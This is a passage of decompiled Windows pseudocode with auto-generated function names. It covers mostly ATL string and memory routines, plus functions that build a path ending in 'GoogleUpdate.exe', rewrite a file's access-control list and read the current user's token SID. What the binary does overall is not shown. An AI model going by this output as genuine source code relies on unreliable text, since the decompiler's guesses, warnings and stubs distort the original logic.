        iVar5 = iVar5 + 1;
      }
      iVar3 = iVar3 + 2 >> 1;
    } while (iVar3 < iVar1);
    if (bVar2) {
      ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)param_1,iVar1);
    }
  }
  return iVar5;
}



int __thiscall FUN_004028e0(void *this,short param_1,int param_2)

{
  int iVar1;
  short *psVar2;
  
                    // WARNING: Load size is inaccurate
  if (((-1 < param_2) && (iVar1 = *this, param_2 < *(int *)(iVar1 + -0xc))) &&
     (psVar2 = FUN_00403139((short *)(iVar1 + param_2 * 2),param_1), psVar2 != (short *)0x0)) {
    return (int)psVar2 - iVar1 >> 1;
  }
  return -1;
}



int * __thiscall FUN_0040290f(void *this,int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int **ppiVar3;
  undefined4 *puVar4;
  
  if (param_2 < 0) {
    param_2 = 0;
  }
                    // WARNING: Load size is inaccurate
  iVar1 = *this;
  iVar2 = *(int *)(iVar1 + -0xc);
  if (param_2 < iVar2) {
    puVar4 = (undefined4 *)FUN_00402bcc((int *)this);
    FUN_00402bef(param_1,iVar1 + (iVar2 - param_2) * 2,param_2,puVar4);
  }
  else {
    ppiVar3 = FUN_00401aca((int **)(iVar1 + -0x10));
    *param_1 = (int)(ppiVar3 + 4);
  }
  return param_1;
}



int * __thiscall FUN_00402958(void *this,int *param_1,int param_2)

{
  int iVar1;
  int **ppiVar2;
  undefined4 *puVar3;
  
  if (param_2 < 0) {
    param_2 = 0;
  }
                    // WARNING: Load size is inaccurate
  iVar1 = *this;
  if (param_2 < *(int *)(iVar1 + -0xc)) {
    puVar3 = (undefined4 *)FUN_00402bcc((int *)this);
    FUN_00402bef(param_1,iVar1,param_2,puVar3);
  }
  else {
    ppiVar2 = FUN_00401aca((int **)(iVar1 + -0x10));
    *param_1 = (int)(ppiVar2 + 4);
  }
  return param_1;
}



uint __thiscall FUN_00402998(void *this,uint param_1)

{
  code *pcVar1;
  uint uVar2;
  
                    // WARNING: Load size is inaccurate
  if ((-1 < (int)param_1) && ((int)param_1 <= *(int *)(*this + -0xc))) {
    return param_1 & 0xffff0000 | (uint)*(ushort *)(*this + param_1 * 2);
  }
  ATL::AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



void __thiscall FUN_004029bc(void *this,int param_1,int param_2)

{
  code *pcVar1;
  int iVar2;
  int iVar3;
  
                    // WARNING: Load size is inaccurate
  iVar2 = *(int *)(*this + -0xc);
  if (-1 < param_2) {
    if (param_1 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = FUN_0041cc9c((byte)this,(int)this);
    }
    if (iVar2 <= 0x7fffffff - iVar3) {
      iVar2 = iVar2 + iVar3;
      ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,iVar2);
      FUN_00423348(iVar3 * 2);
      ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)this,iVar2);
      return;
    }
  }
  ATL::AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



BOOL __fastcall FUN_00402a4d(LPWSTR *param_1)

{
  BOOL BVar1;
  int extraout_EDX;
  
  if ((int)(1U - *(int *)(*param_1 + -2) | *(int *)(*param_1 + -4) - 0x104U) < 0) {
    ATL::CSimpleStringT<char,0>::PrepareWrite2((CSimpleStringT_char_0_ *)param_1,0x104);
  }
  BVar1 = PathAppendW(*param_1,L"GoogleUpdate.exe");
  ReleaseBuffer((int *)param_1,extraout_EDX,-1);
  return BVar1;
}



void __fastcall FUN_00402a8e(void **param_1,undefined2 param_2,uint param_3)

{
  void *pvVar1;
  
  pvVar1 = *param_1;
  if ((uint)((int)param_1[1] - (int)pvVar1) <= param_3) {
    if (param_3 <= (uint)((int)param_1[1] - (int)pvVar1)) {
      return;
    }
    FUN_00402c53(param_1,param_2,(int)pvVar1 + (param_3 - (int)param_1[1]));
    FUN_00416e80((uint *)param_1[1],0,(int)*param_1 + (param_3 - (int)param_1[1]));
    pvVar1 = *param_1;
  }
  param_1[1] = (void *)((int)pvVar1 + param_3);
  return;
}



int ** __fastcall FUN_00402ad4(int **param_1)

{
  int *piVar1;
  int *piVar2;
  
  piVar2 = *param_1;
  if (*(char *)((int)piVar2 + 0xd) == '\0') {
    piVar1 = (int *)piVar2[2];
    if (*(char *)((int)(int *)piVar2[2] + 0xd) == '\0') {
      do {
        piVar2 = piVar1;
        piVar1 = (int *)*piVar2;
      } while (*(char *)((int)piVar1 + 0xd) == '\0');
      *param_1 = piVar2;
    }
    else {
      while ((piVar2 = (int *)piVar2[1], *(char *)((int)piVar2 + 0xd) == '\0' &&
             (*param_1 == (int *)piVar2[2]))) {
        *param_1 = piVar2;
      }
      *param_1 = piVar2;
    }
  }
  return param_1;
}



void __thiscall FUN_00402b0e(void *this,int *param_1)

{
  int *piVar1;
  int **ppiVar2;
  int iVar3;
  undefined4 *puVar4;
  
  piVar1 = *(int **)((int)this + 4);
                    // WARNING: Load size is inaccurate
  if ((param_1 < piVar1) && (*this < param_1 || *this == param_1)) {
                    // WARNING: Load size is inaccurate
    iVar3 = *this;
    if (piVar1 == *(int **)((int)this + 8)) {
      FUN_00402ceb((int **)this);
    }
    puVar4 = *(undefined4 **)((int)this + 4);
    if (puVar4 == (undefined4 *)0x0) goto LAB_00402b63;
                    // WARNING: Load size is inaccurate
    iVar3 = *(int *)(*this + ((int)param_1 - iVar3 >> 2) * 4);
  }
  else {
    if (piVar1 == *(int **)((int)this + 8)) {
      FUN_00402ceb((int **)this);
    }
    puVar4 = *(undefined4 **)((int)this + 4);
    if (puVar4 == (undefined4 *)0x0) goto LAB_00402b63;
    iVar3 = *param_1;
  }
  ppiVar2 = FUN_00401aca((int **)(iVar3 + -0x10));
  *puVar4 = ppiVar2 + 4;
LAB_00402b63:
  *(int *)((int)this + 4) = *(int *)((int)this + 4) + 4;
  return;
}



void __fastcall FUN_00402b6e(int **param_1)

{
  int *piVar1;
  int *piVar2;
  
  piVar1 = param_1[1];
  for (piVar2 = *param_1; piVar2 != piVar1; piVar2 = piVar2 + 1) {
    FUN_00401df0((int **)(*piVar2 + -0x10));
  }
  param_1[1] = *param_1;
  return;
}



// Library Function - Single Match
//  private: char * __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite(int)
// 
// Library: Visual Studio 2012 Release

char * __thiscall
ATL::CSimpleStringT<char,0>::PrepareWrite(CSimpleStringT_char_0_ *this,int param_1)

{
  code *pcVar1;
  char *pcVar2;
  
  if (-1 < param_1) {
    if ((int)(1U - *(int *)(*(int *)this + -4) | *(int *)(*(int *)this + -8) - param_1) < 0) {
      PrepareWrite2(this,param_1);
    }
    return *(char **)this;
  }
  AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  pcVar2 = (char *)(*pcVar1)();
  return pcVar2;
}



void __fastcall FUN_00402bcc(int *param_1)

{
  int iVar1;
  int *piVar2;
  
  if (*(int **)(*param_1 + -0x10) == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = (**(code **)(**(int **)(*param_1 + -0x10) + 0x10))();
  }
  if (iVar1 == 0) {
    piVar2 = (int *)FUN_0040139e();
                    // WARNING: Could not recover jumptable at 0x00402beb. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar2 + 0x10))();
    return;
  }
  return;
}



int * __thiscall FUN_00402bef(void *this,int param_1,int param_2,undefined4 *param_3)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  int extraout_ECX;
  long lVar4;
  
  if (param_3 == (undefined4 *)0x0) {
    lVar4 = -0x7fffbffb;
  }
  else {
    if ((param_1 != 0) || (param_2 == 0)) {
      iVar2 = (**(code **)*param_3)(param_2,2);
      if (iVar2 != 0) {
        *(int *)this = iVar2 + 0x10;
        ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)this,param_2);
        FUN_00423348(extraout_ECX);
        return (int *)this;
      }
      goto LAB_00402c4d;
    }
    lVar4 = -0x7ff8ffa9;
  }
  ATL::AtlThrowImpl(lVar4);
LAB_00402c4d:
  FUN_00401c40();
  pcVar1 = (code *)swi(3);
  piVar3 = (int *)(*pcVar1)();
  return piVar3;
}



void __fastcall FUN_00402c53(void **param_1,undefined2 param_2,uint param_3)

{
  void *pvVar1;
  void *pvVar2;
  code *pcVar3;
  uint uVar4;
  void *_Dst;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  
  pvVar1 = param_1[1];
  if ((uint)((int)param_1[2] - (int)pvVar1) < param_3) {
    if ((uint)((int)*param_1 + (-1 - (int)pvVar1)) < param_3) {
      FUN_00422ea9(pvVar1,param_2);
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    uVar4 = FUN_00402d96(param_1,(int)pvVar1 + (param_3 - (int)*param_1));
    _Dst = (void *)FUN_00402eab(extraout_ECX,extraout_EDX,uVar4);
    FID_conflict__memcpy(_Dst,*param_1,(int)param_1[1] - (int)*param_1);
    pvVar1 = param_1[1];
    pvVar2 = *param_1;
    if (*param_1 != (void *)0x0) {
      FID_conflict__free(*param_1);
    }
    *param_1 = _Dst;
    param_1[2] = (void *)(uVar4 + (int)_Dst);
    param_1[1] = (void *)(((int)pvVar1 - (int)pvVar2) + (int)_Dst);
  }
  return;
}



void __fastcall FUN_00402ccf(void **param_1)

{
  if (*param_1 != (void *)0x0) {
    FID_conflict__free(*param_1);
    *param_1 = (void *)0x0;
    param_1[1] = (void *)0x0;
    param_1[2] = (void *)0x0;
  }
  return;
}



void __fastcall FUN_00402ceb(int **param_1)

{
  int *piVar1;
  code *pcVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  
  piVar1 = param_1[2];
  if ((int)piVar1 - (int)param_1[1] >> 2 == 0) {
    iVar4 = (int)param_1[1] - (int)*param_1 >> 2;
    if (iVar4 == 0x3fffffff) {
      FUN_00422ea9(param_1,(short)piVar1);
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    uVar5 = iVar4 + 1;
    uVar3 = (int)piVar1 - (int)*param_1 >> 2;
    if (0x3fffffff - (uVar3 >> 1) < uVar3) {
      uVar3 = 0;
    }
    else {
      uVar3 = uVar3 + (uVar3 >> 1);
    }
    if (uVar3 < uVar5) {
      uVar3 = uVar5;
    }
    FUN_00402dbf(param_1,uVar3,uVar3);
  }
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<char,0>::SetLength(int)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

void __thiscall ATL::CSimpleStringT<char,0>::SetLength(CSimpleStringT_char_0_ *this,int param_1)

{
  code *pcVar1;
  
  if ((-1 < param_1) && (param_1 <= *(int *)(*(int *)this + -8))) {
    *(int *)(*(int *)this + -0xc) = param_1;
    *(undefined *)(param_1 + *(int *)this) = 0;
    return;
  }
  AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __fastcall FUN_00402d6d(void *param_1,undefined2 param_2,int param_3)

{
  int iVar1;
  
  if (param_3 == 0) {
    iVar1 = 0;
  }
  else {
    iVar1 = FUN_0041c12a(param_1,param_2);
  }
  FUN_004029bc(param_1,param_3,iVar1);
  return;
}



uint __thiscall FUN_00402d96(void *this,uint param_1)

{
  uint uVar1;
  
                    // WARNING: Load size is inaccurate
  uVar1 = *(int *)((int)this + 8) - *this;
  if (-(uVar1 >> 1) - 1 < uVar1) {
    uVar1 = 0;
  }
  else {
    uVar1 = uVar1 + (uVar1 >> 1);
  }
  if (uVar1 < param_1) {
    uVar1 = param_1;
  }
  return uVar1;
}



void __fastcall FUN_00402dbf(int **param_1,undefined4 param_2,uint param_3)

{
  int *piVar1;
  int *piVar2;
  int **ppiVar3;
  int *piVar4;
  int iVar5;
  int *piVar6;
  
  piVar2 = (int *)FUN_00402ed5(param_1,param_2,param_3);
  piVar1 = param_1[1];
  piVar4 = piVar2;
  for (piVar6 = *param_1; piVar6 != piVar1; piVar6 = piVar6 + 1) {
    if (piVar4 != (int *)0x0) {
      ppiVar3 = FUN_00401aca((int **)(*piVar6 + -0x10));
      *piVar4 = (int)(ppiVar3 + 4);
    }
    piVar4 = piVar4 + 1;
  }
  piVar1 = param_1[1];
  piVar6 = *param_1;
  iVar5 = (int)piVar1 - (int)piVar6;
  if (piVar6 != (int *)0x0) {
    for (; piVar6 != piVar1; piVar6 = piVar6 + 1) {
      FUN_00401df0((int **)(*piVar6 + -0x10));
    }
    FID_conflict__free(*param_1);
  }
  *param_1 = piVar2;
  param_1[2] = piVar2 + param_3;
  param_1[1] = piVar2 + (iVar5 >> 2);
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite2(int)
// 
// Library: Visual Studio 2012 Release

void __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite2(CSimpleStringT_char_0_ *this,int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)this;
  if (*(int *)(iVar1 + -0xc) != param_1 && param_1 <= *(int *)(iVar1 + -0xc)) {
    param_1 = *(int *)(iVar1 + -0xc);
  }
  if (*(int *)(iVar1 + -4) < 2) {
    iVar1 = *(int *)(iVar1 + -8);
    if (iVar1 < param_1) {
      if (iVar1 < 0x40000001) {
        iVar1 = iVar1 + iVar1 / 2;
      }
      else {
        iVar1 = iVar1 + 0x100000;
      }
      if (iVar1 < param_1) {
        iVar1 = param_1;
      }
      Reallocate(this,iVar1);
    }
  }
  else {
    FUN_00402f04(this,param_1);
  }
  return;
}



int __fastcall FUN_00402eab(undefined4 param_1,undefined4 param_2,size_t param_3)

{
  code *pcVar1;
  int iVar2;
  undefined8 uVar3;
  
  iVar2 = 0;
  if ((param_3 != 0) && (uVar3 = FUN_00416f82(param_3), iVar2 = (int)uVar3, iVar2 == 0)) {
    FUN_00422e78(0,(int)((ulonglong)uVar3 >> 0x20));
    pcVar1 = (code *)swi(3);
    iVar2 = (*pcVar1)();
    return iVar2;
  }
  return iVar2;
}



int __fastcall FUN_00402ed5(undefined4 param_1,undefined4 param_2,uint param_3)

{
  code *pcVar1;
  int iVar2;
  undefined8 uVar3;
  
  iVar2 = 0;
  if (param_3 == 0) {
    return 0;
  }
  if (param_3 < 0x40000000) {
    uVar3 = FUN_00416f82(param_3 << 2);
    param_2 = (undefined4)((ulonglong)uVar3 >> 0x20);
    iVar2 = (int)uVar3;
    if (iVar2 != 0) {
      return iVar2;
    }
  }
  FUN_00422e78(iVar2,param_2);
  pcVar1 = (code *)swi(3);
  iVar2 = (*pcVar1)();
  return iVar2;
}



void __thiscall FUN_00402f04(void *this,undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  code *pcVar3;
  undefined4 *puVar4;
  int iVar5;
  int extraout_ECX;
  
                    // WARNING: Load size is inaccurate
  iVar1 = *this;
  uVar2 = *(undefined4 *)(iVar1 + -0xc);
  puVar4 = (undefined4 *)(**(code **)(**(int **)(iVar1 + -0x10) + 0x10))();
  iVar5 = (**(code **)*puVar4)(param_1,1);
  if (iVar5 != 0) {
    FUN_00423348(extraout_ECX);
    *(undefined4 *)(iVar5 + 4) = uVar2;
    FUN_00401df0((int **)(iVar1 + -0x10));
    *(int *)this = iVar5 + 0x10;
    return;
  }
  FUN_00401c40();
  pcVar3 = (code *)swi(3);
  (*pcVar3)();
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<char,0>::Reallocate(int)
// 
// Library: Visual Studio 2012 Release

void __thiscall ATL::CSimpleStringT<char,0>::Reallocate(CSimpleStringT_char_0_ *this,int param_1)

{
  code *pcVar1;
  int iVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)(*(int *)this + -0x10);
  if ((*(int *)(*(int *)this + -8) < param_1) && (0 < param_1)) {
    iVar2 = (**(code **)(**ppiVar3 + 8))(ppiVar3,param_1,1);
    if (iVar2 != 0) {
      *(int *)this = iVar2 + 0x10;
      return;
    }
  }
  FUN_00401c40();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __cdecl FUN_00402fa2(CSimpleStringT_char_0_ *param_1,LPCWSTR param_2)

{
  code *pcVar1;
  int iVar2;
  char *pcVar3;
  undefined8 uVar4;
  long lVar5;
  
  if (param_2 == (LPCWSTR)0x0) {
    lVar5 = -0x7ff8ffa9;
  }
  else {
    uVar4 = FUN_004030e0(param_2,&stack0x0000000c);
    iVar2 = (int)uVar4;
    if (-1 < iVar2) {
      pcVar3 = ATL::CSimpleStringT<char,0>::PrepareWrite(param_1,iVar2);
      FUN_0040303b(pcVar3,iVar2 + 1,param_2,&stack0x0000000c);
      ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)param_1,iVar2);
      return;
    }
    lVar5 = -0x7fffbffb;
  }
  ATL::AtlThrowImpl(lVar5);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Removing unreachable block (ram,0x00403030)

undefined4 __fastcall FUN_00402ff7(int *param_1,undefined4 param_2,size_t param_3)

{
  undefined4 uVar1;
  int iVar2;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  if (param_3 == 0) {
    uVar1 = 0;
  }
  else {
    iVar2 = FUN_00402eab(param_1,param_2,param_3);
    *param_1 = iVar2;
    param_1[1] = iVar2;
    param_1[2] = iVar2 + param_3;
    uVar1 = CONCAT31((int3)(iVar2 + param_3 >> 8),1);
  }
  return uVar1;
}



void __fastcall FUN_0040303b(undefined4 param_1,uint param_2,LPCWSTR param_3,va_list param_4)

{
  code *pcVar1;
  uint uVar2;
  DWORD DVar3;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  long lVar4;
  WCHAR local_810 [1028];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  SetLastError(0);
  uVar2 = wvsprintfW(local_810,param_3,param_4);
  DVar3 = GetLastError();
  if ((DVar3 == 0) && ((int)uVar2 < 0x401)) {
    if (uVar2 < param_2) {
      uVar2 = FUN_0041c12a(extraout_ECX,extraout_DX);
      if (uVar2 < param_2) {
                    // WARNING: Subroutine does not return
        __break();
      }
    }
    lVar4 = -0x7ff8ffa9;
  }
  else {
    lVar4 = -0x7fffbffb;
  }
  ATL::AtlThrowImpl(lVar4);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined8 __fastcall FUN_004030e0(LPCWSTR param_1,va_list param_2)

{
  code *pcVar1;
  DWORD DVar2;
  undefined8 uVar3;
  WCHAR local_810 [1028];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  SetLastError(0);
  wvsprintfW(local_810,param_1,param_2);
  DVar2 = GetLastError();
  if (DVar2 == 0) {
    uVar3 = FUN_0041a954();
    return uVar3;
  }
  ATL::AtlThrowImpl(-0x7fffbffb);
  pcVar1 = (code *)swi(3);
  uVar3 = (*pcVar1)();
  return uVar3;
}



short * __fastcall FUN_00403139(short *param_1,short param_2)

{
  if (param_1 == (short *)0x0) {
    return param_1;
  }
  while( true ) {
    if (*param_1 == 0) {
      return (short *)((uint)param_1 & (*param_1 != param_2) - 1);
    }
    if (*param_1 == param_2) break;
    param_1 = param_1 + 1;
  }
  return param_1;
}



// Library Function - Single Match
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::AppendChar(wchar_t)
// 
// Library: Visual Studio 2015 Release

void __thiscall
ATL::CSimpleStringT<wchar_t,0>::AppendChar(CSimpleStringT_wchar_t_0_ *this,wchar_t param_1)

{
  int iVar1;
  int iVar2;
  char *pcVar3;
  
  iVar2 = *(int *)(*(int *)this + -0xc);
  iVar1 = iVar2 + 1;
  pcVar3 = CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,iVar1);
  *(undefined2 *)(pcVar3 + iVar2 * 2) = (undefined2)param_1;
  SetLength(this,iVar1);
  return;
}



uint __thiscall FUN_00403189(void *this,int *param_1)

{
  uint in_EAX;
  uint uVar1;
  PACL pDacl;
  DWORD dwErrCode;
  PACL pSacl;
  
  if (this == (void *)0x0) {
    uVar1 = in_EAX & 0xffffff00;
  }
  else {
    pSacl = (PACL)0x0;
    pDacl = (PACL)FUN_00403fc6(param_1);
    dwErrCode = SetNamedSecurityInfoW((LPWSTR)this,SE_FILE_OBJECT,4,(PSID)0x0,(PSID)0x0,pDacl,pSacl)
    ;
    SetLastError(dwErrCode);
    uVar1 = (uint)(dwErrCode == 0);
  }
  return uVar1;
}



uint __fastcall FUN_004031c4(int param_1,int param_2)

{
  uint in_EAX;
  BOOL BVar1;
  
  if (((((PSID)(param_1 + 4) != (PSID)0x0) && ((PSID)(param_2 + 4) != (PSID)0x0)) &&
      (in_EAX = FUN_004042dd(param_1), (char)in_EAX != '\0')) &&
     (in_EAX = FUN_004042dd(param_2), (char)in_EAX != '\0')) {
    BVar1 = EqualSid((PSID)(param_1 + 4),(PSID)(param_2 + 4));
    return (uint)(BVar1 != 0);
  }
  return in_EAX & 0xffffff00;
}



void __thiscall FUN_00403201(void *this,PSECURITY_DESCRIPTOR param_1)

{
  code *pcVar1;
  PSECURITY_DESCRIPTOR pSecurityDescriptor;
  void *pvVar2;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  int extraout_ECX;
  void *local_c;
  void *local_8;
  
  pSecurityDescriptor = param_1;
  local_c = this;
  local_8 = this;
  local_8 = (void *)GetSecurityDescriptorLength(param_1);
  pvVar2 = _malloc((size_t)local_8);
  *(void **)((int)this + 4) = pvVar2;
  if (pvVar2 == (void *)0x0) {
    DVar4 = 0x8007000e;
  }
  else {
    BVar3 = GetSecurityDescriptorControl
                      (pSecurityDescriptor,(PSECURITY_DESCRIPTOR_CONTROL)&param_1,(LPDWORD)&local_c)
    ;
    if (BVar3 != 0) {
      if (((uint)param_1 & 0x8000) != 0) {
        iVar5 = FUN_00423348(extraout_ECX);
        ATL::AtlCrtErrorCheck(iVar5);
        return;
      }
      BVar3 = MakeSelfRelativeSD(pSecurityDescriptor,*(PSECURITY_DESCRIPTOR *)((int)this + 4),
                                 (LPDWORD)&local_8);
      if (BVar3 != 0) {
        return;
      }
    }
    DVar4 = FUN_004042f7();
    FID_conflict__free(*(void **)((int)this + 4));
    *(undefined4 *)((int)this + 4) = 0;
  }
  ATL::AtlThrowImpl(DVar4);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __thiscall FUN_00403299(void *this,int *param_1)

{
  int *this_00;
  
  this_00 = (int *)((int)this + 0xc);
  if (this_00 != param_1) {
    (**(code **)(*this_00 + 4))();
    if (param_1[1] != 0) {
      FUN_00403201(this_00,(PSECURITY_DESCRIPTOR)param_1[1]);
    }
  }
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)this = 0xc;
  *(undefined4 *)((int)this + 4) = *(undefined4 *)((int)this + 0x10);
  return;
}



undefined8 __thiscall FUN_004032d9(void *this,void *param_1)

{
  undefined4 *puVar1;
  DWORD DVar2;
  PSID *TokenInformation;
  BOOL BVar3;
  uint extraout_ECX;
  int extraout_EDX;
  undefined4 *_Memory;
  undefined8 uVar4;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (param_1 == (void *)0x0) goto LAB_0040338e;
  GetTokenInformation(*(HANDLE *)((int)this + 4),TokenUser,(LPVOID)0x0,0,&local_c);
  TokenInformation = (PSID *)&stack0xffffffe0;
  DVar2 = GetLastError();
  if (DVar2 != 0x7a) goto LAB_0040338e;
  local_10 = (undefined4 *)0x0;
  if (local_c < 0x401) {
    uVar4 = FUN_00403ae0(local_c,extraout_EDX);
    if ((char)uVar4 == '\0') goto LAB_00403344;
    FUN_0041cc70(extraout_ECX,(int)((ulonglong)uVar4 >> 0x20));
    _Memory = (undefined4 *)0x0;
  }
  else {
LAB_00403344:
    TokenInformation = (PSID *)FUN_00403b47(&local_10,local_c);
    _Memory = local_10;
  }
  if ((TokenInformation != (PSID *)0x0) &&
     (BVar3 = GetTokenInformation(*(HANDLE *)((int)this + 4),TokenUser,TokenInformation,local_c,
                                  &local_c), BVar3 != 0)) {
    FUN_00403bb5(param_1,*TokenInformation);
  }
  while (_Memory != (undefined4 *)0x0) {
    puVar1 = (undefined4 *)*_Memory;
    FID_conflict__free(_Memory);
    _Memory = puVar1;
  }
LAB_0040338e:
  uVar4 = FUN_0041a954();
  return uVar4;
}



undefined4 * __thiscall FUN_004033a4(void *this,byte param_1)

{
  FUN_004033c3((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_004033c3(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042f0d8;
  FID_conflict__free((void *)param_1[0x1d]);
  FID_conflict__free((void *)param_1[0x1e]);
  *param_1 = &PTR_FUN_0042f12c;
  FUN_00404997(param_1);
  return;
}



int __fastcall FUN_004033ec(int *param_1)

{
  uint uVar1;
  uint *puVar2;
  code *pcVar3;
  undefined uVar4;
  size_t _Size;
  uint *puVar5;
  int iVar6;
  int extraout_ECX;
  uint *puVar7;
  
  if (param_1[0x1b] == 0) {
    _Size = (**(code **)(*param_1 + 8))();
    puVar5 = (uint *)_malloc(_Size);
    if (puVar5 == (uint *)0x0) {
      ATL::AtlThrowImpl(-0x7ff8fff2);
      pcVar3 = (code *)swi(3);
      iVar6 = (*pcVar3)();
      return iVar6;
    }
    FUN_00416e80(puVar5,0,_Size);
    *(short *)((int)puVar5 + 2) = (short)_Size;
    *(undefined *)((int)puVar5 + 1) = *(undefined *)(param_1 + 0x1a);
    uVar4 = (**(code **)(*param_1 + 0xc))();
    *(undefined *)puVar5 = uVar4;
    uVar1 = param_1[0x19];
    puVar5[2] = 0;
    puVar5[1] = uVar1;
    if (param_1[0x1d] != 0) {
      puVar2 = (uint *)param_1[0x1d];
      puVar5[3] = *puVar2;
      puVar5[4] = puVar2[1];
      puVar5[5] = puVar2[2];
      puVar5[6] = puVar2[3];
      puVar5[2] = 1;
    }
    puVar2 = (uint *)param_1[0x1e];
    if (puVar2 != (uint *)0x0) {
      puVar7 = puVar5 + 7;
      if (param_1[0x1d] == 0) {
        puVar7 = puVar5 + 3;
      }
      *puVar7 = *puVar2;
      puVar7[1] = puVar2[1];
      puVar7[2] = puVar2[2];
      puVar7[3] = puVar2[3];
      puVar5[2] = puVar5[2] | 2;
    }
    GetLengthSid(param_1 + 2);
    iVar6 = FUN_00423348(extraout_ECX);
    ATL::AtlCrtErrorCheck(iVar6);
    param_1[0x1b] = (int)puVar5;
  }
  return param_1[0x1b];
}



void __thiscall FUN_00403512(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  
  puVar1 = *(undefined4 **)((int)this + 0x74);
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = &DAT_0042d67c;
  }
  *param_1 = *puVar1;
  param_1[1] = puVar1[1];
  param_1[2] = puVar1[2];
  param_1[3] = puVar1[3];
  return;
}



void __thiscall FUN_00403532(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  
  puVar1 = *(undefined4 **)((int)this + 0x78);
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = &DAT_0042d67c;
  }
  *param_1 = *puVar1;
  param_1[1] = puVar1[1];
  param_1[2] = puVar1[2];
  param_1[3] = puVar1[3];
  return;
}



undefined4 * __thiscall
FUN_00403552(void *this,int param_1,undefined4 param_2,undefined param_3,undefined param_4,
            undefined4 *param_5,undefined4 *param_6)

{
  code *pcVar1;
  undefined4 *puVar2;
  undefined *extraout_ECX;
  undefined *puVar3;
  
  FUN_004043ac(this,param_1,param_2,param_3,param_4);
  *(undefined4 *)((int)this + 0x74) = 0;
  *(undefined4 *)((int)this + 0x78) = 0;
  *(undefined ***)this = &PTR_FUN_0042f0d8;
  puVar3 = extraout_ECX;
  if (param_5 != (undefined4 *)0x0) {
    puVar3 = &DAT_004378aa;
    puVar2 = (undefined4 *)FUN_00423559((int)extraout_ECX);
    if (puVar2 == (undefined4 *)0x0) {
      puVar2 = (undefined4 *)0x0;
    }
    else {
      *puVar2 = *param_5;
      puVar2[1] = param_5[1];
      puVar2[2] = param_5[2];
      puVar2[3] = param_5[3];
    }
    *(undefined4 **)((int)this + 0x74) = puVar2;
    if (puVar2 == (undefined4 *)0x0) goto LAB_004035e5;
  }
  if (param_6 != (undefined4 *)0x0) {
    puVar2 = (undefined4 *)FUN_00423559((int)puVar3);
    if (puVar2 == (undefined4 *)0x0) {
      puVar2 = (undefined4 *)0x0;
    }
    else {
      *puVar2 = *param_6;
      puVar2[1] = param_6[1];
      puVar2[2] = param_6[2];
      puVar2[3] = param_6[3];
    }
    *(undefined4 **)((int)this + 0x78) = puVar2;
    if (puVar2 == (undefined4 *)0x0) {
      FID_conflict__free(*(void **)((int)this + 0x74));
      *(undefined4 *)((int)this + 0x74) = 0;
LAB_004035e5:
      ATL::AtlThrowImpl(-0x7ff8fff2);
      pcVar1 = (code *)swi(3);
      puVar2 = (undefined4 *)(*pcVar1)();
      return puVar2;
    }
  }
  return (undefined4 *)this;
}



undefined8 __thiscall FUN_004035f0(void *this,PACL param_1)

{
  code *pcVar1;
  BOOL BVar2;
  void *this_00;
  byte *pbVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  undefined4 local_90;
  void *local_8c;
  undefined4 local_88;
  uint local_84;
  byte *local_80;
  undefined4 *local_7c;
  undefined4 local_78 [24];
  uint local_18 [3];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (param_1 == (PACL)0x0) {
